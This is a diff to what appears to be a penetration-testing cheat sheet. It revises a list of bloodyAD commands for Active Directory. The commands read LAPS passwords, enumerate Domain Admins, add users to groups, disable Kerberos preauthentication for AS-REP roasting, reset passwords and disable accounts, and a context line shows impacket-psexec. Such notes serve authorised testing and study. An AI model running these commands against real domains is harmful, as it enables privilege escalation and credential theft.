@@ -370,22 +370,25 @@ impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass    # PsExec using Kerber
 
 ```bash
 # GET
-bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' get writable                                      # list objects/attributes the current user can modify
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<TLD>' --type user                       # list domain user objects
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<TLD>' --attr ms-DS-MachineAccountQuota    # read MAQ value
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd                      # read LAPS password
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get membership <USER>                                                 # Group membership determines effective user privileges.
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<sAMAccountName>'                                         # Queries a domain sAMAccountName using valid LDAP credentials.
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object "Domain Admins" --attr member                              # Lists high-privileged Domain Admin members.
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' get writable                                      # list objects and attributes the current user can modify
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' get children 'DC=<DOMAIN>,DC=<TLD>' --type user  # list domain user objects
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' get object 'DC=<DOMAIN>,DC=<TLD>' --attr ms-DS-MachineAccountQuota  # read MachineAccountQuota
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd  # read the LAPS password when permitted
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' get membership '<USERNAME>'                  # inspect effective group membership
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' get object '<SAM_ACCOUNT_NAME>'              # query a user object with LDAP credentials
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' get object 'Domain Admins' --attr member       # list Domain Admin members
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' get object '<TARGET_USER>' --attr accountExpires  # read account expiration as Windows FILETIME
+
 # ADD
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'    # add user to group
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac <USERNAME> DONT_REQ_PREAUTH       # disable preauth requirement
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' add groupMember '<GROUP>' '<USERNAME>'  # add a user to a group
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' add uac '<USERNAME>' DONT_REQ_PREAUTH     # enable AS-REP roasting by disabling preauthentication
 
 # SET
-bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' set restore 'CN=<NAME>\0ADEL:<OBJECT_GUID>,CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>'    # restore deleted AD object; use exact tombstone DN
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'                                                     # set AD user password
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac <USERNAME> -f ACCOUNTDISABLE                                                       # disable user account
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac <USERNAME> -f ACCOUNTDISABLE                                                    # enable user account
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' set restore 'CN=<NAME>\0ADEL:<OBJECT_GUID>,CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>'  # restore a deleted object using its exact tombstone DN
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' set password '<TARGET_USER>' '<NEW_PASSWORD>'  # reset an AD user password when permitted
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' add uac '<TARGET_USER>' -f ACCOUNTDISABLE     # disable a user account
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' remove uac '<TARGET_USER>' -f ACCOUNTDISABLE  # enable a user account
+bloodyAD --host <RHOST> -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' set object '<TARGET_USER>' accountExpires -v '<WINDOWS_FILETIME>'  # set account expiration
 ```
 
 ## AD DNS
